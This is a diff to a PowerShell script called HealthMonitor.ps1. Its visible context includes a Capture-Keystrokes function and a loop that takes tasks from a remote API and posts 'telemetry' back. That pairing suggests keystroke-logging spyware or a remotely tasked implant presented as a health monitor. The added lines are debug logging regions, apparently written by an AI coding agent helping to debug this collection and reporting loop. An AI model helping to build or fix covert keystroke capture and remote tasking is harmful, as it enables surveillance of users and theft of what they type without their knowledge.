@@ -174,7 +174,8 @@ function Capture-Keystrokes {
         $exceptionsInLoop = 0
         
         # Monitor keystrokes until duration expires
-        while ((Get-Date) -lt $endTime) {
+        $currentTime = Get-Date
+        while ($currentTime -lt $endTime) {
             $loopIterations++
             $currentTime = Get-Date
             
@@ -481,13 +482,25 @@ while ($true) {
                     }
                     
                     # Insert into telemetry table
-                    Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
+                    #region agent log
+                    $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:484';message='Sending telemetry';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
+                    #endregion
+                    $telemetryResult = Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData
+                    #region agent log
+                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:484';message='Telemetry result';data=@{taskId=$task.id;success=($null -ne $telemetryResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
+                    #endregion
                     
                     # Mark task as complete
-                    Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
+                    #region agent log
+                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:487';message='Updating task status to complete';data=@{taskId=$task.id}} | ConvertTo-Json -Compress | Add-Content $logPath
+                    #endregion
+                    $statusUpdateResult = Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                         status = "complete"
                         completed_at = (Get-Date -Format "o")
-                    } | Out-Null
+                    }
+                    #region agent log
+                    @{sessionId='debug-session';runId='run1';hypothesisId='H6';location='HealthMonitor.ps1:490';message='Task status update result';data=@{taskId=$task.id;success=($null -ne $statusUpdateResult)}} | ConvertTo-Json -Compress | Add-Content $logPath
+                    #endregion
                 }
             }
         }
